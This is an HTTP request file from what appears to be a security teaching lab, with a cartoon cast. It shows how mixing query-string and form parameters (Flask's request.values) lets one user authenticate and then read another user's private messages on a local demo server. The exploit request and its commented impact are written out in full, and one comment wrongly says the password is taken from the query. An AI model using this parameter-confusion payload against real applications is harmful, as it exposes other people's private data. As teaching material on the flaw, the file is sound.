@base = http://localhost:8000/ii/source-precedence/example8

### SpongeBob authenticates and retrieves his messages using POST body
POST {{base}}
Content-Type: application/x-www-form-urlencoded

user=spongebob&password=bikinibottom

# Results in 200 OK:
#
# {
#   "owner": "spongebob",
#   "messages": [
#     {
#       "from": "patrick",
#       "message": "SpongeBob! I'm ready! I'm ready! Let's go jellyfishing!"
#     }
#   ]
# }

###

### EXPLOIT: Plankton exploits request.values in authentication with form-only retrieval
### Provides SpongeBob username in query (used by request.values auth) and Squidward in form (used by retrieval)
POST {{base}}?user=spongebob
Content-Type: application/x-www-form-urlencoded

user=squidward&password=bikinibottom

# Results in data disclosure:
#
# {
#   "owner": "squidward",
#   "messages": [
#     {
#       "from": "mr.krabs",
#       "message": "Squidward, I'm switching yer shifts to Tuesday through Saturday. No complaints!"
#     },
#     {
#       "from": "squidward",
#       "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
#     }
#   ]
# }
#
# IMPACT: This reverses the previous attack! Now request.values in authentication
# reads "spongebob" from query (with password from query via request.values),
# while message retrieval reads "squidward" from form data only. Plankton steals
# Squidward's secrets by exploiting the asymmetry between request.values authentication
# and form-only data access. This demonstrates that request.values is dangerous in
# EITHER position - whether in authentication or data access.
